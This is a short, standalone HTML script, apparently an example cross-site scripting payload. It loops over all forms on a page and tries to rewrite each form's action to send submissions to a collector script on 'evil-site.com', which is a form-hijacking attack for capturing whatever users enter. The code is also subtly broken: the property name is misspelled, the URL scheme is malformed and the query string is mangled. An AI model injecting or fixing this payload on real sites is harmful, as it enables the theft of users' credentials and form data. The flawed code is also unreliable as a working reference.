<script>
    for (i = 0; i < document.forms.length; i++) {
        var originalFormAction = document.forms[i].action;

        document.forms[i].acation = "https:://evil-site.com/catcher.php=orig=" + originalFormAction
    }
</script>